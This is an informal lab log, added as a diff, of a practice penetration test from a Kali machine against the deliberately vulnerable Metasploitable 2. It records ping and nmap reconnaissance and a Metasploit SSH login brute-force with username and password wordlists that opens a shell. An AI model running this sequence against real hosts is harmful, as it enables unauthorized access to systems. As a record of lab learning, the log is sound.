@@ -1,0 +1,85 @@
+# Raw AAR 
+
+Pentest Lab Live Action Report 2 
+
+MAY 22 2025
+# is the start of live code copied from kali 
+- notes or comments
+
+START
+ 
+- logged into kali and metasploitable 2
+- test out basic commands in kali 
+pwd
+whoami
+ls -l 
+cd /example
+cd .. 
+cd/example 2 
+# sudo su 
+ - time to ping our target sees if anyone is awake
+
+# ping -c 5 <target ip> 
+
+# PING <target ip> 56(84) bytes of data.
+64 bytes from <target ip> : icmp_seq=1 ttl=64 time=0.958 ms
+64 bytes from <target ip> icmp_seq=2 ttl=64 time=8.05 ms
+64 bytes from <target ip>: icmp_seq=3 ttl=64 time=0.759 ms
+64 bytes from <target ip>: icmp_seq=4 ttl=64 time=1.89 ms
+64 bytes from <target ip>: icmp_seq=5 ttl=64 time=0.731 ms
+
+--- <target ip> ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4023ms  rtt min/avg/max/mdev = 0.731/2.478/8.053/2.819 ms
+success. he has a pulse and were ready to take it away.
+
+- time to recon and see find a weakness in their defense 
+# nmap -O -sV <target ip>
+- recon was successful 
+ # 22/tcp   open  ssh         OpenSSH 4.7p1 
+they wont know what hit them. 
+#service postgresql start 
+# msfdb init
+- we are ready to fire for effect
+msfconsole
+#db_status
+- success
+- we are up and running
+- creating HQ 
+# workspace -a labtest 
+- ready for forward operations 
+# db_nmap -O -sV -p- <target ip>
+ - logging recon data 
+# hosts 
+# services 
+- information ready for action.
+- setting target
+# set RHOST <target ip>
+ # search ssh_login
+# auxiliary/scanner/ssh/ssh_login 
+# show options
+ #  set RHOST <target ip>
+# set USER_FILE
+# set USER_FILE /home/j9west/user.txt 
+# set PASS_FILE /home/j9west/pass.txt
+ # set VERBOSE true 
+- radio silence. focus on the obj.
+# set STOP_ON_SUCCESS true 
+- ATTACK
+# exploit
+- ssh in mine now
+ # sessions
+# sessions -i 1 
+ # whoami
+# msfadmin
+# uname -a
+- confirmation i have breached the target 
+- mission completed
+time to exfil 
+#exit 
+sessions
+# No active sessions 
+exit root
+exit user 
+shutdown kali
+shutdown metasploitable 2
+- rest and recover for next mission. 
